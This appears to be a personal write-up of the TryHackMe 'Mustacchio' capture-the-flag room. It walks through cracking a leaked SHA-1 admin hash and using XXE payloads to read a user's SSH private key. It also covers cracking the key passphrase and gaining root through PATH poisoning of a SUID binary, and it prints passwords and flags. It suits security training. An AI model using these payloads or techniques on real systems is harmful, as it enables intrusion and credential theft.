-----------------------------------------------
# THM Mustacchio
Tags:  #Writeup #Hacking
Creation date: 2021-10-06

-----------------------------------------------

## [[Recon]]

### [[Nmap]]

![[must-nmap.png]]

### [[Gobuster]]

![[must-directory.png]]

## [[Enumeration]]

### Custom directory

Contents of `/custom` directory

![[must-custom.png]]

Contents of `/custom/js` directory

![[must-sutom-js.png]]

users.bak content (`strings users.bak`):

```
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

username and hashed password combo in `users.bak`:

`admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

[[hash identifier]] Ids hash as [[SHA-1]]

![[must-hash-id.png]]

Running against [[rockyou]] with [[Hashcat]] gives us a decoded password for the admin user.

`1868e36a6d2b17d4c2745f1659433a54d4bc5f4b:bulldog19`

So user pass combo is:

`admin:bulldog19`

### port 8765

Connecting to the IP on port 8765 gives us an admin login page.

![[must-admin.png]]

Using the user pass combo we found in the custom directory we can gain access to a comment box for the website.

![[must-comment.png]]

Checking the [[source code]] for this page gives us a few interesting points.
Firstly we can see that an alert can pop up telling us to insert [[XML]] code.
Second is comment left by a dev telling `barry` they can use their [[SSH]] key to gain access to the system now.
Third is a line `document.cookie=/auth/dontforget.bak` that has been commented out but gives us a location of another `.bak` file.

![[must-source.png]]

Contents of `/auth/dontforget.bak`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space.
	  If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. 
	  Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. 
	  You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. 
	  If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>
```

While this may sound like its a rabbit hole we shouldn't pay attention to, it also gives us the [[XML]] format for submitting a comment on this page:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name></name>
  <author></author>
  <com></com>
</comment>
```

Looking into [[XML]] [[Vulnerabilities]] we can find something called [[XXE]] or XML External Entity.

Using the following payload from payloadallthethings repo we can test for [[XXE]] in this web form.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY content "This is content"> ]>
<comment>
  <name>john</name>
  <author>foo</author>
  <com>&content;</com>
</comment>
```

![[must-xxe-test.png]]

As the comment contained the entity we defined in the line `<!DOCTYPE replace [<!ENTITY content "This is content"> ]>` we know XXE is present and we can use this to grab files from the target system. In this case due to the hint from the source code about `barry` and his SSH key we should probably try to grab that. This can be done with the following payload. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [  
  <!ELEMENT data ANY >
  <!ENTITY content SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
<comment>
  <name>foo</name>
  <author>bar</author>
  <com>&content;</com>
</comment>
```

![[must-barry-idrsa.png]]


## User

We have an [[SSH]] for the user `barry` on the target system now, lets try to log in.

![[must-ssh-denied.png]]

Turns out we need a passphrase for this [[SSH]] key to work.

Lets use [[John The Ripper]] to crack it against [[rockyou]].

![[must-john.png]]

using the passphrase `urieljames` to log in via [[SSH]].

![[must-ssh-login.png]]

We have user on the machine...

User flag: `62d77a4d5f97d47c5aa38b3b2651b831`

## Root

We cannot access any [[sudo]] commands due to no knowing barry's system password. Lets look for [[SUID]] file instead.

![[must-suid.png]]

Most promising file in this list is `/home/joe/live_log`.

Running the file just gives us a live look at the log files for the web server.

![[must-live-log.png]]

running `strings live_log` gives us this line in the code where it uses the `tail` system command to read an access log file.

![[must-strings.png]]

We can use [[Path Poisoning]] to create our own `tail` file to give us a root shell.

![[must-rooted-and-booted.png]]

Root flag: `3223581420d906c4dd1a5f9b530393a5`